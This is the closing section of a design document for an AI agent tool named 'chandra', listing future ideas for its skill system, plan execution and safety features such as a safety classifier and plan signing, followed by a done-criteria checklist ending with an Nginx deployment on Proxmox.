## 18. Future Considerations (Post v2.3)

These are out of scope for v2.x but worth tracking:

### Skill System Enhancements
- **Skill versioning/updates:** Detect CLI version changes, offer to re-explore
- **Knowledge feedback loop:** Append troubleshooting notes to skills after successful recovery
- **Remote skill registry:** `chandra skill install <url>` from vetted repository
- **tldr integration:** Augment --help with tldr pages for faster exploration
- **Skill marketplace:** Community repository with ratings, versioned dependencies, validation

### Adaptive Capabilities
- **Incremental skill learning:** Skills that improve based on usage patterns and success rates
- **Predictive skill loading:** Preload likely skills based on conversation flow and temporal patterns
- **Skill analytics:** Track success/failure rates, command popularity, suggest improvements

### Plan Execution
- **Composition DSL:** Declarative YAML-based workflow definitions for reusable deployment recipes
- **Terraform-style declarative:** For infrastructure, prefer declarative over imperative rollback
- **Plan templates:** Reusable plan patterns (e.g., "deploy containerized app" as a template)

### Advanced Features
- **LLM safety classifier:** Run generated skill content through safety model before approval
- **Plan state signing:** SHA256 integrity hash on execution plan state for tamper detection
- **Trust levels:** Auto-approve patterns after N days of stability (vs manual approval always)

---

## 19. Done Criteria

- [ ] Skill loading: SKILL.md files parse correctly, requirements validated
- [ ] Skill matching: relevant skills appear in context based on triggers
- [ ] Skill generation: can discover CLI, install it, generate SKILL.md
- [ ] Goal decomposition: complex requests produce multi-step plans
- [ ] Plan execution: steps run in order, checkpoints pause for confirmation
- [ ] Rollback: failed steps trigger rollback of previous steps
- [ ] Infrastructure awareness: knows about hosts, services, resources
- [ ] Dynamic skill creation: missing capabilities trigger skill generation
- [ ] End-to-end: "deploy Nginx" works from scratch on a system with only Proxmox
